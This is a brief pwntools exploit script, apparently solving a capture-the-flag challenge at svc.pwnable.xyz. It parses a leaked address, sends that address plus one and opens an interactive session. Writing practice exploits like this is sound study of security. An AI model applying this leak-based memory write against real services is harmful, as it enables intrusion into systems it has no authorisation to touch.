from pwn import *

conn = remote("svc.pwnable.xyz",30000)

print conn.recvuntil("Leak:")
leakAddr = int(conn.recvline(),16)
print conn.recvuntil(":")

conn.sendline(str(leakAddr+1))
conn.recvuntil(":")
conn.sendline("")
conn.interactive()
